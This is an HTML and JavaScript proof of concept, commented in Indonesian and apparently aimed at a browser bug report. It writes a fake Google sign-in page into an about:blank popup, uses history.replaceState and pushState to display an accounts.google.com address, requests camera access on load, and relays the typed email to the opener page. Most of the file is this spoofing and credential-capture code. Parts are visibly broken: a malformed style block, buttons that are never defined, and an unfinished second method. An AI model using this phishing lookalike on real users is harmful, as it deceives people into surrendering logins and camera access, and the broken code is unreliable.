<!DOCTYPE html>

<head>

<style>

  .success { color: #4caf50; font-weight: bold; }
  .error { color: #f44336; }
  .info { color: #2196f3; }
  .warn { color: #ff9800; font-weight: bold; }
</style>
</head>
<body>

<div id="log">Menunggu perintah...</div>

<script>
(function() {
  'use strict';

  const logEl = document.getElementById('log');

  function log(msg, type = '') {
    const time = new Date().toISOString().substr(11, 8);
    const line = `[${time}] ${msg}\n`;
    const span = document.createElement('span');
    if (type) span.className = type;
    span.textContent = line;
    logEl.appendChild(span);
    logEl.scrollTop = logEl.scrollHeight;
    console.log(msg);
  }

  // ============================================
  // KONTEN HALAMAN GOOGLE PALSU + KAMERA
  // ============================================
  function getGoogleCameraHTML(manipulateHistory) {
    return `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

            color: #202124;
            margin-bottom: 8px;

            justify-content: center;

          }
          .g-icon {
            width: 32px;
            height: 32px;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="%23EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="%234285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="%23FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="%2334A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>') no-repeat center;
            background-size: contain;
          }
          h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 10px; }
          p.subtitle { font-size: 16px; color: #202124; margin-bottom: 30px; }
          input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 20px; outline: none; }
          input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }

          .footer { margin-top: 40px; font-size: 12px; color: #5f6368; }
          .camera-area { margin-top: 20px; padding: 10px; border: 1px dashed #ccc; border-radius: 4px; display: none; }
          video { width: 100%; max-width: 200px; border-radius: 4px; }
        </style>
      </head>
      <body>
        <div class="login-card">
          <div class="google-logo"><div class="g-icon"></div><span>Sign in with Google</span></div>
          <h1>Sign in</h1>
          <p class="subtitle">to continue to Gmail</p>
          <input type="email" id="email" placeholder="Email or phone" autofocus />
          <div class="btn-row">
            <button class="btn-create">Create account</button>
            <button class="btn-next" id="nextBtn">Next</button>
          </div>
          <div class="camera-area" id="cameraArea">
            <p style="font-size:12px;color:#666;">Camera feed:</p>
            <video id="video" autoplay playsinline></video>
          </div>
          <div class="footer">This is a UI Spoofing PoC — not a real Google page.</div>
        </div>
        <script>
          (function() {
            var statusEl = document.createElement('div');
            statusEl.style.cssText = 'position:fixed;bottom:10px;right:10px;font-size:10px;color:#999;background:#fff;padding:4px 8px;border-radius:4px;';
            document.body.appendChild(statusEl);
            statusEl.textContent = 'Origin: ' + location.origin + ' | Href: ' + location.href;

            ${manipulateHistory ? `
              try {
                history.replaceState({ spoof: true }, 'Sign in - Google Accounts', 'https://accounts.google.com/signin/v2/identifier');
                parent.postMessage({ status: 'replaceState_success', url: 'https://accounts.google.com/signin/v2/identifier' }, '*');
              } catch(e) {
                parent.postMessage({ status: 'replaceState_fail', error: e.name + ': ' + e.message }, '*');
              }
              try {
                history.pushState({ spoof: true }, 'Sign in - Google Accounts', 'https://accounts.google.com/signin/v2/identifier');
                parent.postMessage({ status: 'pushState_success', url: 'https://accounts.google.com/signin/v2/identifier' }, '*');
              } catch(e) {
                parent.postMessage({ status: 'pushState_fail', error: e.name + ': ' + e.message }, '*');
              }
              try { document.title = 'Sign in - Google Accounts'; } catch(e) {}
            ` : ''}

            // Fungsi minta kamera
            function requestCamera() {
              if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                parent.postMessage({ status: 'no_camera_api' }, '*');
                return;
              }
              navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(function(stream) {
                  parent.postMessage({ status: 'camera_granted' }, '*');
                  document.getElementById('cameraArea').style.display = 'block';
                  document.getElementById('video').srcObject = stream;
                })
                .catch(function(err) {
                  parent.postMessage({ status: 'camera_error', error: err.name + ': ' + err.message }, '*');
                });
            }

            // Panggil kamera segera setelah halaman dimuat
            // (race condition: sebelum origin null diterapkan?)
            requestCamera();

            // Juga panggil setelah 100ms
            setTimeout(requestCamera, 100);

            document.getElementById('nextBtn').addEventListener('click', function() {
              parent.postMessage({ status: 'login_attempt', email: document.getElementById('email').value }, '*');
            });

            parent.postMessage({ status: 'origin_info', origin: location.origin, href: location.href }, '*');
          })();
        <\/script>
      </body>
      </html>
    `;
  }

  // ============================================
  // METODE 1: Race + replaceState + Kamera
  // ============================================
  document.getElementById('btnCameraRace').onclick = () => {
    log('=== METODE 1: Race + replaceState + Kamera ===', 'info');

    const win = window.open('about:blank', '_blank');
    if (!win) { log('❌ Popup diblokir.', 'error'); return; }
    log('Tab about:blank dibuka.', 'success');

    try {
      win.document.open();
      win.document.write(getGoogleCameraHTML(true));
      win.document.close();
      log('Konten Google palsu + kamera ditulis.', 'success');
    } catch (e) {
      log('❌ Gagal tulis: ' + e.message, 'error');
      return;
    }

    window.addEventListener('message', (e) => {
      if (e.data && e.data.status) {
        const s = e.data.status;
        if (s === 'replaceState_success') log('🎯 replaceState BERHASIL ke: ' + e.data.url, 'success');
        else if (s === 'replaceState_fail') log('❌ replaceState gagal: ' + e.data.error, 'error');
        else if (s === 'pushState_success') log('🎯 pushState BERHASIL ke: ' + e.data.url, 'success');
        else if (s === 'pushState_fail') log('❌ pushState gagal: ' + e.data.error, 'error');
        else if (s === 'origin_info') log('📋 Origin: ' + e.data.origin + ' | Href: ' + e.data.href, 'info');
        else if (s === 'camera_granted') log('🎯 BUG: IZIN KAMERA DIBERIKAN DARI ABOUT:BLANK!', 'success');
        else if (s === 'camera_error') log('❌ Kamera gagal: ' + e.data.error, 'error');
        else if (s === 'no_camera_api') log('❌ getUserMedia tidak didukung.', 'error');
        else if (s === 'login_attempt') log('⚠️ Login attempt: ' + e.data.email, 'warn');
      }
    }, { once: false });

    log('Perhatikan: prompt kamera mungkin muncul seolah dari Google.', 'warn');
    log('Jika izin diberikan, itu BUG (Critical).', 'info');
  };

  // ============================================
  // METODE 2: pushState + Kamera
  // ============================================
  document.getElementById('btnCameraPush').onclick = () => {
    log('=== METODE 2: pushState + Kamera ===', 'info');

  // ============================================

  document.getElementById('clear').onclick = () => {
    logEl.textContent = '';
    log('Log dibersihkan.', 'info');
  };

  // ============================================

  log('PoC siap. Pilih metode di atas.', 'info');
  log('⚠️ Browser modern memblokir kamera dari about:blank.', 'warn');
  log('   Jika prompt muncul, itu BUG (Critical).', 'info');

})();
</script>
